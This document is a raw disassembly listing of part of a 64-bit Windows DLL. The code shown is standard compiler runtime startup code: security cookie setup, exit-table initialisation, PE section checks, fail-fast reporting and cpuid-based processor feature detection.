   180001761:	48 83 c4 40          	add    $0x40,%rsp
   180001765:	5f                   	pop    %rdi
   180001766:	5e                   	pop    %rsi
   180001767:	5b                   	pop    %rbx
   180001768:	c3                   	ret
   180001769:	cc                   	int3
   18000176a:	cc                   	int3
   18000176b:	cc                   	int3
   18000176c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001771:	55                   	push   %rbp
   180001772:	48 8b ec             	mov    %rsp,%rbp
   180001775:	48 83 ec 30          	sub    $0x30,%rsp
   180001779:	48 8b 05 80 28 00 00 	mov    0x2880(%rip),%rax        # 0x180004000
   180001780:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180001787:	2b 00 00 
   18000178a:	48 3b c3             	cmp    %rbx,%rax
   18000178d:	75 74                	jne    0x180001803
   18000178f:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   180001794:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   180001798:	ff 15 da 18 00 00    	call   *0x18da(%rip)        # 0x180003078
   18000179e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1800017a2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1800017a6:	ff 15 d4 18 00 00    	call   *0x18d4(%rip)        # 0x180003080
   1800017ac:	8b c0                	mov    %eax,%eax
   1800017ae:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1800017b2:	ff 15 d0 18 00 00    	call   *0x18d0(%rip)        # 0x180003088
   1800017b8:	8b c0                	mov    %eax,%eax
   1800017ba:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1800017be:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   1800017c2:	ff 15 c8 18 00 00    	call   *0x18c8(%rip)        # 0x180003090
   1800017c8:	8b 45 18             	mov    0x18(%rbp),%eax
   1800017cb:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800017cf:	48 c1 e0 20          	shl    $0x20,%rax
   1800017d3:	48 33 45 18          	xor    0x18(%rbp),%rax
   1800017d7:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   1800017db:	48 33 c1             	xor    %rcx,%rax
   1800017de:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   1800017e5:	ff 00 00 
   1800017e8:	48 23 c1             	and    %rcx,%rax
   1800017eb:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   1800017f2:	2b 00 00 
   1800017f5:	48 3b c3             	cmp    %rbx,%rax
   1800017f8:	48 0f 44 c1          	cmove  %rcx,%rax
   1800017fc:	48 89 05 fd 27 00 00 	mov    %rax,0x27fd(%rip)        # 0x180004000
   180001803:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180001808:	48 f7 d0             	not    %rax
   18000180b:	48 89 05 2e 28 00 00 	mov    %rax,0x282e(%rip)        # 0x180004040
   180001812:	48 83 c4 30          	add    $0x30,%rsp
   180001816:	5d                   	pop    %rbp
   180001817:	c3                   	ret
   180001818:	48 8d 0d e1 69 00 00 	lea    0x69e1(%rip),%rcx        # 0x180008200
   18000181f:	48 ff 25 4a 18 00 00 	rex.W jmp *0x184a(%rip)        # 0x180003070
   180001826:	cc                   	int3
   180001827:	cc                   	int3
   180001828:	48 8d 0d d1 69 00 00 	lea    0x69d1(%rip),%rcx        # 0x180008200
   18000182f:	e9 02 08 00 00       	jmp    0x180002036
   180001834:	48 8d 05 d5 69 00 00 	lea    0x69d5(%rip),%rax        # 0x180008210
   18000183b:	c3                   	ret
   18000183c:	48 8d 05 d5 69 00 00 	lea    0x69d5(%rip),%rax        # 0x180008218
   180001843:	c3                   	ret
   180001844:	48 83 ec 28          	sub    $0x28,%rsp
   180001848:	e8 e7 ff ff ff       	call   0x180001834
   18000184d:	48 83 08 24          	orq    $0x24,(%rax)
   180001851:	e8 e6 ff ff ff       	call   0x18000183c
   180001856:	48 83 08 02          	orq    $0x2,(%rax)
   18000185a:	48 83 c4 28          	add    $0x28,%rsp
   18000185e:	c3                   	ret
   18000185f:	cc                   	int3
   180001860:	48 83 ec 28          	sub    $0x28,%rsp
   180001864:	e8 bb 07 00 00       	call   0x180002024
   180001869:	85 c0                	test   %eax,%eax
   18000186b:	74 21                	je     0x18000188e
   18000186d:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180001874:	00 00 
   180001876:	48 8b 48 08          	mov    0x8(%rax),%rcx
   18000187a:	eb 05                	jmp    0x180001881
   18000187c:	48 3b c8             	cmp    %rax,%rcx
   18000187f:	74 14                	je     0x180001895
   180001881:	33 c0                	xor    %eax,%eax
   180001883:	f0 48 0f b1 0d 9c 69 	lock cmpxchg %rcx,0x699c(%rip)        # 0x180008228
   18000188a:	00 00 
   18000188c:	75 ee                	jne    0x18000187c
   18000188e:	32 c0                	xor    %al,%al
   180001890:	48 83 c4 28          	add    $0x28,%rsp
   180001894:	c3                   	ret
   180001895:	b0 01                	mov    $0x1,%al
   180001897:	eb f7                	jmp    0x180001890
   180001899:	cc                   	int3
   18000189a:	cc                   	int3
   18000189b:	cc                   	int3
   18000189c:	48 83 ec 28          	sub    $0x28,%rsp
   1800018a0:	e8 7f 07 00 00       	call   0x180002024
   1800018a5:	85 c0                	test   %eax,%eax
   1800018a7:	74 07                	je     0x1800018b0
   1800018a9:	e8 a2 04 00 00       	call   0x180001d50
   1800018ae:	eb 19                	jmp    0x1800018c9
   1800018b0:	e8 67 07 00 00       	call   0x18000201c
   1800018b5:	8b c8                	mov    %eax,%ecx
   1800018b7:	e8 98 07 00 00       	call   0x180002054
   1800018bc:	85 c0                	test   %eax,%eax
   1800018be:	74 04                	je     0x1800018c4
   1800018c0:	32 c0                	xor    %al,%al
   1800018c2:	eb 07                	jmp    0x1800018cb
   1800018c4:	e8 91 07 00 00       	call   0x18000205a
   1800018c9:	b0 01                	mov    $0x1,%al
   1800018cb:	48 83 c4 28          	add    $0x28,%rsp
   1800018cf:	c3                   	ret
   1800018d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800018d4:	33 c9                	xor    %ecx,%ecx
   1800018d6:	e8 2d 01 00 00       	call   0x180001a08
   1800018db:	84 c0                	test   %al,%al
   1800018dd:	0f 95 c0             	setne  %al
   1800018e0:	48 83 c4 28          	add    $0x28,%rsp
   1800018e4:	c3                   	ret
   1800018e5:	cc                   	int3
   1800018e6:	cc                   	int3
   1800018e7:	cc                   	int3
   1800018e8:	48 83 ec 28          	sub    $0x28,%rsp
   1800018ec:	e8 83 07 00 00       	call   0x180002074
   1800018f1:	84 c0                	test   %al,%al
   1800018f3:	75 04                	jne    0x1800018f9
   1800018f5:	32 c0                	xor    %al,%al
   1800018f7:	eb 12                	jmp    0x18000190b
   1800018f9:	e8 76 07 00 00       	call   0x180002074
   1800018fe:	84 c0                	test   %al,%al
   180001900:	75 07                	jne    0x180001909
   180001902:	e8 6d 07 00 00       	call   0x180002074
   180001907:	eb ec                	jmp    0x1800018f5
   180001909:	b0 01                	mov    $0x1,%al
   18000190b:	48 83 c4 28          	add    $0x28,%rsp
   18000190f:	c3                   	ret
   180001910:	48 83 ec 28          	sub    $0x28,%rsp
   180001914:	e8 5b 07 00 00       	call   0x180002074
   180001919:	e8 56 07 00 00       	call   0x180002074
   18000191e:	b0 01                	mov    $0x1,%al
   180001920:	48 83 c4 28          	add    $0x28,%rsp
   180001924:	c3                   	ret
   180001925:	cc                   	int3
   180001926:	cc                   	int3
   180001927:	cc                   	int3
   180001928:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000192d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180001932:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001937:	57                   	push   %rdi
   180001938:	48 83 ec 20          	sub    $0x20,%rsp
   18000193c:	49 8b f9             	mov    %r9,%rdi
   18000193f:	49 8b f0             	mov    %r8,%rsi
   180001942:	8b da                	mov    %edx,%ebx
   180001944:	48 8b e9             	mov    %rcx,%rbp
   180001947:	e8 d8 06 00 00       	call   0x180002024
   18000194c:	85 c0                	test   %eax,%eax
   18000194e:	75 16                	jne    0x180001966
   180001950:	83 fb 01             	cmp    $0x1,%ebx
   180001953:	75 11                	jne    0x180001966
   180001955:	4c 8b c6             	mov    %rsi,%r8
   180001958:	33 d2                	xor    %edx,%edx
   18000195a:	48 8b cd             	mov    %rbp,%rcx
   18000195d:	48 8b c7             	mov    %rdi,%rax
   180001960:	ff 15 e2 17 00 00    	call   *0x17e2(%rip)        # 0x180003148
   180001966:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   18000196b:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   18000196f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001974:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180001979:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   18000197e:	48 83 c4 20          	add    $0x20,%rsp
   180001982:	5f                   	pop    %rdi
   180001983:	e9 c6 06 00 00       	jmp    0x18000204e
   180001988:	48 83 ec 28          	sub    $0x28,%rsp
   18000198c:	e8 93 06 00 00       	call   0x180002024
   180001991:	85 c0                	test   %eax,%eax
   180001993:	74 10                	je     0x1800019a5
   180001995:	48 8d 0d 9c 68 00 00 	lea    0x689c(%rip),%rcx        # 0x180008238
   18000199c:	48 83 c4 28          	add    $0x28,%rsp
   1800019a0:	e9 c1 06 00 00       	jmp    0x180002066
   1800019a5:	e8 ce 06 00 00       	call   0x180002078
   1800019aa:	85 c0                	test   %eax,%eax
   1800019ac:	75 05                	jne    0x1800019b3
   1800019ae:	e8 b9 06 00 00       	call   0x18000206c
   1800019b3:	48 83 c4 28          	add    $0x28,%rsp
   1800019b7:	c3                   	ret
   1800019b8:	48 83 ec 28          	sub    $0x28,%rsp
   1800019bc:	33 c9                	xor    %ecx,%ecx
   1800019be:	e8 b1 06 00 00       	call   0x180002074
   1800019c3:	48 83 c4 28          	add    $0x28,%rsp
   1800019c7:	e9 a8 06 00 00       	jmp    0x180002074
   1800019cc:	48 83 ec 28          	sub    $0x28,%rsp
   1800019d0:	85 c9                	test   %ecx,%ecx
   1800019d2:	75 07                	jne    0x1800019db
   1800019d4:	c6 05 55 68 00 00 01 	movb   $0x1,0x6855(%rip)        # 0x180008230
   1800019db:	e8 70 03 00 00       	call   0x180001d50
   1800019e0:	e8 8f 06 00 00       	call   0x180002074
   1800019e5:	84 c0                	test   %al,%al
   1800019e7:	75 04                	jne    0x1800019ed
   1800019e9:	32 c0                	xor    %al,%al
   1800019eb:	eb 14                	jmp    0x180001a01
   1800019ed:	e8 82 06 00 00       	call   0x180002074
   1800019f2:	84 c0                	test   %al,%al
   1800019f4:	75 09                	jne    0x1800019ff
   1800019f6:	33 c9                	xor    %ecx,%ecx
   1800019f8:	e8 77 06 00 00       	call   0x180002074
   1800019fd:	eb ea                	jmp    0x1800019e9
   1800019ff:	b0 01                	mov    $0x1,%al
   180001a01:	48 83 c4 28          	add    $0x28,%rsp
   180001a05:	c3                   	ret
   180001a06:	cc                   	int3
   180001a07:	cc                   	int3
   180001a08:	40 53                	rex push %rbx
   180001a0a:	48 83 ec 20          	sub    $0x20,%rsp
   180001a0e:	80 3d 1c 68 00 00 00 	cmpb   $0x0,0x681c(%rip)        # 0x180008231
   180001a15:	8b d9                	mov    %ecx,%ebx
   180001a17:	75 67                	jne    0x180001a80
   180001a19:	83 f9 01             	cmp    $0x1,%ecx
   180001a1c:	77 6a                	ja     0x180001a88
   180001a1e:	e8 01 06 00 00       	call   0x180002024
   180001a23:	85 c0                	test   %eax,%eax
   180001a25:	74 28                	je     0x180001a4f
   180001a27:	85 db                	test   %ebx,%ebx
   180001a29:	75 24                	jne    0x180001a4f
   180001a2b:	48 8d 0d 06 68 00 00 	lea    0x6806(%rip),%rcx        # 0x180008238
   180001a32:	e8 29 06 00 00       	call   0x180002060
   180001a37:	85 c0                	test   %eax,%eax
   180001a39:	75 10                	jne    0x180001a4b
   180001a3b:	48 8d 0d 0e 68 00 00 	lea    0x680e(%rip),%rcx        # 0x180008250
   180001a42:	e8 19 06 00 00       	call   0x180002060
   180001a47:	85 c0                	test   %eax,%eax
   180001a49:	74 2e                	je     0x180001a79
   180001a4b:	32 c0                	xor    %al,%al
   180001a4d:	eb 33                	jmp    0x180001a82
   180001a4f:	66 0f 6f 05 79 17 00 	movdqa 0x1779(%rip),%xmm0        # 0x1800031d0
   180001a56:	00 
   180001a57:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180001a5b:	f3 0f 7f 05 d5 67 00 	movdqu %xmm0,0x67d5(%rip)        # 0x180008238
   180001a62:	00 
   180001a63:	48 89 05 de 67 00 00 	mov    %rax,0x67de(%rip)        # 0x180008248
   180001a6a:	f3 0f 7f 05 de 67 00 	movdqu %xmm0,0x67de(%rip)        # 0x180008250
   180001a71:	00 
   180001a72:	48 89 05 e7 67 00 00 	mov    %rax,0x67e7(%rip)        # 0x180008260
   180001a79:	c6 05 b1 67 00 00 01 	movb   $0x1,0x67b1(%rip)        # 0x180008231
   180001a80:	b0 01                	mov    $0x1,%al
   180001a82:	48 83 c4 20          	add    $0x20,%rsp
   180001a86:	5b                   	pop    %rbx
   180001a87:	c3                   	ret
   180001a88:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001a8d:	e8 fa 00 00 00       	call   0x180001b8c
   180001a92:	cc                   	int3
   180001a93:	cc                   	int3
   180001a94:	48 83 ec 18          	sub    $0x18,%rsp
   180001a98:	4c 8b c1             	mov    %rcx,%r8
   180001a9b:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180001aa0:	66 39 05 59 e5 ff ff 	cmp    %ax,-0x1aa7(%rip)        # 0x180000000
   180001aa7:	75 78                	jne    0x180001b21
   180001aa9:	48 63 0d 8c e5 ff ff 	movslq -0x1a74(%rip),%rcx        # 0x18000003c
   180001ab0:	48 8d 15 49 e5 ff ff 	lea    -0x1ab7(%rip),%rdx        # 0x180000000
   180001ab7:	48 03 ca             	add    %rdx,%rcx
   180001aba:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180001ac0:	75 5f                	jne    0x180001b21
   180001ac2:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180001ac7:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180001acb:	75 54                	jne    0x180001b21
   180001acd:	4c 2b c2             	sub    %rdx,%r8
   180001ad0:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180001ad4:	48 83 c2 18          	add    $0x18,%rdx
   180001ad8:	48 03 d1             	add    %rcx,%rdx
   180001adb:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180001adf:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180001ae3:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180001ae7:	48 89 14 24          	mov    %rdx,(%rsp)
   180001aeb:	49 3b d1             	cmp    %r9,%rdx
   180001aee:	74 18                	je     0x180001b08
   180001af0:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180001af3:	4c 3b c1             	cmp    %rcx,%r8
   180001af6:	72 0a                	jb     0x180001b02
   180001af8:	8b 42 08             	mov    0x8(%rdx),%eax
   180001afb:	03 c1                	add    %ecx,%eax
   180001afd:	4c 3b c0             	cmp    %rax,%r8
   180001b00:	72 08                	jb     0x180001b0a
   180001b02:	48 83 c2 28          	add    $0x28,%rdx
   180001b06:	eb df                	jmp    0x180001ae7
   180001b08:	33 d2                	xor    %edx,%edx
   180001b0a:	48 85 d2             	test   %rdx,%rdx
   180001b0d:	75 04                	jne    0x180001b13
   180001b0f:	32 c0                	xor    %al,%al
   180001b11:	eb 14                	jmp    0x180001b27
   180001b13:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180001b17:	7d 04                	jge    0x180001b1d
   180001b19:	32 c0                	xor    %al,%al
   180001b1b:	eb 0a                	jmp    0x180001b27
   180001b1d:	b0 01                	mov    $0x1,%al
   180001b1f:	eb 06                	jmp    0x180001b27
   180001b21:	32 c0                	xor    %al,%al
   180001b23:	eb 02                	jmp    0x180001b27
   180001b25:	32 c0                	xor    %al,%al
   180001b27:	48 83 c4 18          	add    $0x18,%rsp
   180001b2b:	c3                   	ret
   180001b2c:	40 53                	rex push %rbx
   180001b2e:	48 83 ec 20          	sub    $0x20,%rsp
   180001b32:	8a d9                	mov    %cl,%bl
   180001b34:	e8 eb 04 00 00       	call   0x180002024
   180001b39:	33 d2                	xor    %edx,%edx
   180001b3b:	85 c0                	test   %eax,%eax
   180001b3d:	74 0b                	je     0x180001b4a
   180001b3f:	84 db                	test   %bl,%bl
   180001b41:	75 07                	jne    0x180001b4a
   180001b43:	48 87 15 de 66 00 00 	xchg   %rdx,0x66de(%rip)        # 0x180008228
   180001b4a:	48 83 c4 20          	add    $0x20,%rsp
   180001b4e:	5b                   	pop    %rbx
   180001b4f:	c3                   	ret
   180001b50:	40 53                	rex push %rbx
   180001b52:	48 83 ec 20          	sub    $0x20,%rsp
   180001b56:	80 3d d3 66 00 00 00 	cmpb   $0x0,0x66d3(%rip)        # 0x180008230
   180001b5d:	8a d9                	mov    %cl,%bl
   180001b5f:	74 04                	je     0x180001b65
   180001b61:	84 d2                	test   %dl,%dl
   180001b63:	75 0c                	jne    0x180001b71
   180001b65:	e8 0a 05 00 00       	call   0x180002074
   180001b6a:	8a cb                	mov    %bl,%cl
   180001b6c:	e8 03 05 00 00       	call   0x180002074
   180001b71:	b0 01                	mov    $0x1,%al
   180001b73:	48 83 c4 20          	add    $0x20,%rsp
   180001b77:	5b                   	pop    %rbx
   180001b78:	c3                   	ret
   180001b79:	cc                   	int3
   180001b7a:	cc                   	int3
   180001b7b:	cc                   	int3
   180001b7c:	48 8d 05 f5 66 00 00 	lea    0x66f5(%rip),%rax        # 0x180008278
   180001b83:	c3                   	ret
   180001b84:	83 25 dd 66 00 00 00 	andl   $0x0,0x66dd(%rip)        # 0x180008268
   180001b8b:	c3                   	ret
   180001b8c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001b91:	55                   	push   %rbp
   180001b92:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   180001b99:	ff 
   180001b9a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   180001ba1:	8b d9                	mov    %ecx,%ebx
   180001ba3:	b9 17 00 00 00       	mov    $0x17,%ecx
   180001ba8:	ff 15 ea 14 00 00    	call   *0x14ea(%rip)        # 0x180003098
   180001bae:	85 c0                	test   %eax,%eax
   180001bb0:	74 04                	je     0x180001bb6
   180001bb2:	8b cb                	mov    %ebx,%ecx
   180001bb4:	cd 29                	int    $0x29
   180001bb6:	b9 03 00 00 00       	mov    $0x3,%ecx
   180001bbb:	e8 c4 ff ff ff       	call   0x180001b84
   180001bc0:	33 d2                	xor    %edx,%edx
   180001bc2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001bc6:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   180001bcc:	e8 6b 04 00 00       	call   0x18000203c
   180001bd1:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001bd5:	ff 15 c5 14 00 00    	call   *0x14c5(%rip)        # 0x1800030a0
   180001bdb:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   180001be2:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   180001be9:	48 8b cb             	mov    %rbx,%rcx
   180001bec:	45 33 c0             	xor    %r8d,%r8d
   180001bef:	ff 15 43 14 00 00    	call   *0x1443(%rip)        # 0x180003038
   180001bf5:	48 85 c0             	test   %rax,%rax
   180001bf8:	74 3c                	je     0x180001c36
   180001bfa:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180001c00:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   180001c07:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   180001c0e:	4c 8b c8             	mov    %rax,%r9
   180001c11:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180001c16:	4c 8b c3             	mov    %rbx,%r8
   180001c19:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   180001c20:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180001c25:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180001c29:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180001c2e:	33 c9                	xor    %ecx,%ecx
   180001c30:	ff 15 0a 14 00 00    	call   *0x140a(%rip)        # 0x180003040
   180001c36:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180001c3d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180001c42:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   180001c49:	33 d2                	xor    %edx,%edx
   180001c4b:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   180001c52:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   180001c58:	48 83 c0 08          	add    $0x8,%rax
   180001c5c:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   180001c63:	e8 d4 03 00 00       	call   0x18000203c
   180001c68:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   180001c6f:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180001c74:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   180001c7b:	40 
   180001c7c:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180001c83:	00 
   180001c84:	ff 15 de 13 00 00    	call   *0x13de(%rip)        # 0x180003068
   180001c8a:	8b d8                	mov    %eax,%ebx
   180001c8c:	33 c9                	xor    %ecx,%ecx
   180001c8e:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180001c93:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180001c98:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180001c9c:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180001ca1:	ff 15 a9 13 00 00    	call   *0x13a9(%rip)        # 0x180003050
   180001ca7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180001cac:	ff 15 96 13 00 00    	call   *0x1396(%rip)        # 0x180003048
   180001cb2:	85 c0                	test   %eax,%eax
   180001cb4:	75 0d                	jne    0x180001cc3
   180001cb6:	83 fb 01             	cmp    $0x1,%ebx
   180001cb9:	74 08                	je     0x180001cc3
   180001cbb:	8d 48 03             	lea    0x3(%rax),%ecx
   180001cbe:	e8 c1 fe ff ff       	call   0x180001b84
   180001cc3:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   180001cca:	00 
   180001ccb:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   180001cd2:	5d                   	pop    %rbp
   180001cd3:	c3                   	ret
   180001cd4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001cd9:	57                   	push   %rdi
   180001cda:	48 83 ec 20          	sub    $0x20,%rsp
   180001cde:	48 8d 1d 53 1a 00 00 	lea    0x1a53(%rip),%rbx        # 0x180003738
   180001ce5:	48 8d 3d 4c 1a 00 00 	lea    0x1a4c(%rip),%rdi        # 0x180003738
   180001cec:	eb 12                	jmp    0x180001d00
   180001cee:	48 8b 03             	mov    (%rbx),%rax
   180001cf1:	48 85 c0             	test   %rax,%rax
   180001cf4:	74 06                	je     0x180001cfc
   180001cf6:	ff 15 4c 14 00 00    	call   *0x144c(%rip)        # 0x180003148
   180001cfc:	48 83 c3 08          	add    $0x8,%rbx
   180001d00:	48 3b df             	cmp    %rdi,%rbx
   180001d03:	72 e9                	jb     0x180001cee
   180001d05:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001d0a:	48 83 c4 20          	add    $0x20,%rsp
   180001d0e:	5f                   	pop    %rdi
   180001d0f:	c3                   	ret
   180001d10:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001d15:	57                   	push   %rdi
   180001d16:	48 83 ec 20          	sub    $0x20,%rsp
   180001d1a:	48 8d 1d 27 1a 00 00 	lea    0x1a27(%rip),%rbx        # 0x180003748
   180001d21:	48 8d 3d 20 1a 00 00 	lea    0x1a20(%rip),%rdi        # 0x180003748
   180001d28:	eb 12                	jmp    0x180001d3c
   180001d2a:	48 8b 03             	mov    (%rbx),%rax
   180001d2d:	48 85 c0             	test   %rax,%rax
   180001d30:	74 06                	je     0x180001d38
   180001d32:	ff 15 10 14 00 00    	call   *0x1410(%rip)        # 0x180003148
   180001d38:	48 83 c3 08          	add    $0x8,%rbx
   180001d3c:	48 3b df             	cmp    %rdi,%rbx
   180001d3f:	72 e9                	jb     0x180001d2a
   180001d41:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180001d46:	48 83 c4 20          	add    $0x20,%rsp
   180001d4a:	5f                   	pop    %rdi
   180001d4b:	c3                   	ret
   180001d4c:	c2 00 00             	ret    $0x0
   180001d4f:	cc                   	int3
   180001d50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001d55:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180001d5a:	55                   	push   %rbp
   180001d5b:	57                   	push   %rdi
   180001d5c:	41 56                	push   %r14
   180001d5e:	48 8b ec             	mov    %rsp,%rbp
   180001d61:	48 83 ec 10          	sub    $0x10,%rsp
   180001d65:	33 c0                	xor    %eax,%eax
   180001d67:	33 c9                	xor    %ecx,%ecx
   180001d69:	0f a2                	cpuid
   180001d6b:	44 8b c1             	mov    %ecx,%r8d
   180001d6e:	44 8b d2             	mov    %edx,%r10d
   180001d71:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   180001d78:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   180001d7f:	44 8b cb             	mov    %ebx,%r9d
   180001d82:	44 8b f0             	mov    %eax,%r14d
   180001d85:	33 c9                	xor    %ecx,%ecx
   180001d87:	b8 01 00 00 00       	mov    $0x1,%eax
   180001d8c:	0f a2                	cpuid
   180001d8e:	45 0b d0             	or     %r8d,%r10d
   180001d91:	89 45 f0             	mov    %eax,-0x10(%rbp)
   180001d94:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   180001d9b:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   180001d9e:	45 0b d1             	or     %r9d,%r10d
   180001da1:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180001da4:	8b f9                	mov    %ecx,%edi
   180001da6:	89 55 fc             	mov    %edx,-0x4(%rbp)
   180001da9:	75 5b                	jne    0x180001e06
   180001dab:	48 83 0d b5 22 00 00 	orq    $0xffffffffffffffff,0x22b5(%rip)        # 0x180004068
   180001db2:	ff 
   180001db3:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180001db8:	48 c7 05 9d 22 00 00 	movq   $0x8000,0x229d(%rip)        # 0x180004060
   180001dbf:	00 80 00 00 
   180001dc3:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180001dc8:	74 28                	je     0x180001df2
   180001dca:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180001dcf:	74 21                	je     0x180001df2
   180001dd1:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180001dd6:	74 1a                	je     0x180001df2
   180001dd8:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180001ddd:	83 f8 20             	cmp    $0x20,%eax
   180001de0:	77 24                	ja     0x180001e06
   180001de2:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180001de9:	00 00 00 
   180001dec:	48 0f a3 c1          	bt     %rax,%rcx
   180001df0:	73 14                	jae    0x180001e06
   180001df2:	44 8b 05 77 64 00 00 	mov    0x6477(%rip),%r8d        # 0x180008270
   180001df9:	41 83 c8 01          	or     $0x1,%r8d
   180001dfd:	44 89 05 6c 64 00 00 	mov    %r8d,0x646c(%rip)        # 0x180008270
   180001e04:	eb 07                	jmp    0x180001e0d
   180001e06:	44 8b 05 63 64 00 00 	mov    0x6463(%rip),%r8d        # 0x180008270
   180001e0d:	45 33 c9             	xor    %r9d,%r9d
   180001e10:	41 8b f1             	mov    %r9d,%esi
   180001e13:	45 8b d1             	mov    %r9d,%r10d
   180001e16:	45 8b d9             	mov    %r9d,%r11d
   180001e19:	41 83 fe 07          	cmp    $0x7,%r14d
   180001e1d:	7c 65                	jl     0x180001e84
   180001e1f:	41 8d 41 07          	lea    0x7(%r9),%eax
   180001e23:	33 c9                	xor    %ecx,%ecx
   180001e25:	0f a2                	cpuid
   180001e27:	89 45 f0             	mov    %eax,-0x10(%rbp)
   180001e2a:	8b f2                	mov    %edx,%esi
   180001e2c:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   180001e2f:	44 8b cb             	mov    %ebx,%r9d
   180001e32:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180001e35:	89 55 fc             	mov    %edx,-0x4(%rbp)
   180001e38:	0f ba e3 09          	bt     $0x9,%ebx
   180001e3c:	73 0b                	jae    0x180001e49
   180001e3e:	41 83 c8 02          	or     $0x2,%r8d
   180001e42:	44 89 05 27 64 00 00 	mov    %r8d,0x6427(%rip)        # 0x180008270
   180001e49:	83 f8 01             	cmp    $0x1,%eax
   180001e4c:	7c 19                	jl     0x180001e67
   180001e4e:	b8 07 00 00 00       	mov    $0x7,%eax
   180001e53:	8d 48 fa             	lea    -0x6(%rax),%ecx
   180001e56:	0f a2                	cpuid
   180001e58:	44 8b d2             	mov    %edx,%r10d
   180001e5b:	89 45 f0             	mov    %eax,-0x10(%rbp)
   180001e5e:	89 5d f4             	mov    %ebx,-0xc(%rbp)
   180001e61:	89 4d f8             	mov    %ecx,-0x8(%rbp)
   180001e64:	89 55 fc             	mov    %edx,-0x4(%rbp)
